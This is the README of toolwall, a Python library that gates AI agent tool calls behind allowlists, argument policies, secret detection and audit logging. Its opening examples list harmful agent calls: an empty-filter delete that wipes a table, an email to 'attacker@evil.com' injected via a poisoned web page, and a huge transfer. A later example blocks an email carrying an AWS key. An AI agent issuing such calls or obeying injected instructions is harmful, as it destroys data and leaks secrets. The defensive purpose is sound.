# toolwall

[![PyPI version](https://img.shields.io/pypi/v/toolwall.svg)](https://pypi.org/project/toolwall/)
[![Python versions](https://img.shields.io/pypi/pyversions/toolwall.svg)](https://pypi.org/project/toolwall/)
[![License: MIT](https://img.shields.io/pypi/l/toolwall.svg)](https://github.com/Dev-Saif-Ops/toolwall/blob/main/toolwall/LICENSE)
[![Zero dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](https://github.com/Dev-Saif-Ops/toolwall)

**The security gateway for AI agent tool calls.**

Your LLM can generate a *valid* tool call. That doesn't mean it's *safe* to execute.

```python
delete_records(filter={})            # perfectly valid JSON. whole table gone.
send_email(to="attacker@evil.com")   # recipient injected via a poisoned web page
transfer_money(amount=999999999)     # schema-valid. every field the right type.
db_query(limit=10_000_000)           # production melts.
```

Every one of these passes JSON schema validation. Structured outputs, schemas, and
content moderation all wave them through. `toolwall` is the fail-closed checkpoint
between the LLM's tool call and execution that blocks them.

---

## Install

```bash
pip install toolwall
```

Zero required dependencies. Works with OpenAI, Anthropic, and Gemini native tool
calling (and plain dicts). Python 3.10+.

## Quickstart

```python
from toolwall import ToolWall, Policy, ToolSchema, in_range, not_empty

wall = ToolWall()   # default-deny, secret detection + audit on

wall.register("db_query", db_query,
              schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
              policy=Policy(constraints={"limit": in_range(1, 100)}))
wall.register("delete_records", delete_records,
              schema=ToolSchema(required=["filter"], types={"filter": dict}),
              policy=Policy(constraints={"filter": not_empty}, require_approval=True))
wall.budget(max_calls=20)

result = wall.call("delete_records", {"filter": {}})
# result.blocked -> True
# result.reason  -> "policy violation: arg 'filter' rejected by not_empty"

results = wall.guard(openai_response)   # or gate a raw OpenAI/Anthropic/Gemini response
```

Only an `ALLOW` verdict runs the tool. `Gate` is the lower-level primitive underneath.

## What it stops

```python
wall.call("delete_records", {"filter": {}})
# BLOCKED: policy violation: arg 'filter' rejected by not_empty

wall.call("send_email", {"to": "ops@ourco.com", "body": "aws key AKIA..."})
# BLOCKED: secret detected (aws-access-key) in arg 'body'

wall.call("db_query", {"q": "everything", "limit": 10_000_000})
# BLOCKED: policy violation: arg 'limit' rejected by in_range(1, 100)

wall.call("run_shell", {"cmd": "..."})
# BLOCKED: unknown tool: 'run_shell'
```

Everything not explicitly allowed is blocked. That is the whole idea.

## What it does

- **Fail-closed gate**: unknown tool, schema violation, policy violation, budget hit,
  or unparseable payload all block *before* the tool runs. Registration is the allowlist.
- **Policy engine**: value constraints (`in_range`, `one_of`, `matches`, `ends_with`…),
  cross-argument rules, human-approval flags, and budget caps (calls / per-tool / USD).
- **Shield**: detects secrets (AWS, OpenAI, GitHub, Stripe, Slack, JWT, PEM, and
  high-entropy strings) in tool arguments and blocks or redacts them. The audit log
  never contains the secret value.
- **Dry-run**: run your whole agent with `dry_run=True`: nothing executes, and
  `gate.report()` tells you what it *would* have done. `suggest_policies(gate)` drafts
  a starter policy from the calls it observed.
- **MCP guard**: `MCPGuard` puts the same gate in front of any MCP server.
- **Audit trail**: every verdict exported to JSON/CSV.

## Dry-run first

```python
from toolwall import Gate, Meter, suggest_policies

gate = Gate(default="deny", dry_run=True, meter=Meter())
# ... run your agent; ALLOW calls are simulated, never executed ...
print(gate.report())            # verdict counts, blocked reasons, secrets caught
print(suggest_policies(gate))   # a draft policy from observed calls, for you to review
```

## Guard an MCP server

```python
from toolwall import Gate, MCPGuard

guard = MCPGuard(gate, forward=call_downstream_mcp_server)
decision = guard.handle(tool_name, args)   # only ALLOW is forwarded
```

Install the transport extra with `pip install "toolwall[mcp]"`.

## Examples

Runnable scripts live in the [repo `examples/` folder](https://github.com/Dev-Saif-Ops/toolwall/tree/main/toolwall/examples):

- **quickstart.py**: six gated scenarios (allow, unknown tool, out-of-range, empty-filter delete, approval hold, secret block). No API key.
- **dangerous_agent_demo.py**: an off-the-rails agent replayed with vs without the gate. No API key.
- **mcp_guard_demo.py**: the gate in front of an MCP-style server. No API key.
- **live_gemini_agent.py**: a real Gemini agent using native function calling, gated by toolwall. Needs `GEMINI_API_KEY`.

```bash
git clone https://github.com/Dev-Saif-Ops/toolwall && cd toolwall/toolwall
python examples/quickstart.py
python examples/live_gemini_agent.py     # set GEMINI_API_KEY first
```

## Honest status

`toolwall` is alpha. The published failure suite blocks **24 of 24 attack cases across
9 classes with 0 false blocks** on clean traffic, at sub-millisecond overhead. Secret
detection is pattern + entropy based and is **never 100%**. Structureless passwords are
out of scope, and the suite report states exactly what is and is not proven. Every claim
about toolwall cites that report, nothing broader.

## Links

- **Source, full docs, and the failure suite:** https://github.com/Dev-Saif-Ops/toolwall
- **What happened to TOAP** (this project's predecessor, an honest postmortem):
  the [`toap-v0.1-archive`](https://github.com/Dev-Saif-Ops/toolwall/tree/toap-v0.1-archive) branch

## License

MIT © Mohammad Safwan Athar
